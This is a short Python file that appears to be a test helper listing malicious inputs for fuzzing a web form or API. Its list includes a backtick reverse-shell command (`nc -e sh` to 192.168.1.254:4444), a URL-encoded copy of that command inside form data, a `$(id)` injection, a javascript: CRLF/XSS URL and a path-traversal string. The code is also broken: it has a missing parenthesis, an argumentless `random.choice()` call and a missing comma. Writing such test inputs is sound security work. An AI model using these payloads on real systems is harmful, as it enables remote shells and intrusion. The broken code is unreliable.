from __future__ import unicode_literals
import random

SPECIAL_CHARS = [
    '%',
    '`',
    "'",
    '$',
    '&',
    '*',
    '(',
    ')',
    '{',
    '}',
    ';',
    '?',
    '\\',
]

WHITESPACE = [
    "\n",
    "\t",
    " ",
    "\f",
    "\r",
    "\v",
]

def specialstring(n):
    string = ''.join(random.sample(SPECIAL_CHARS, n)
    return string

def longstring(n):
    string = 'a' * n
    return string

MALICIOUS_STRINGS = [
    '', # No value
    longstring(257), # Too long
    specialstring(5), # Special characters
    WHITESPACE[random.choice()],
    "`nc\t-e\tsh\t192.168.1.254\t4444`",
    "'name=jjgjunique&description=jjj&ipaddr=127.0.0.5&uuid=%60nc%09-e%09sh%09192.168.1.254%094444%60&type=Community&icon=%2Ficon&port=80&ttl=0'"
    '$(id)',
    'javascript://127.0.0.1/?%0d%0aalert(document.domain)',
    '../../../README.md%20',
    #Protocols & Paths:
    #http://
    #https://
    #/foo/bar/baz/

    #Machines
    #IP address
    #hostname
    #fqdn
    #url
]
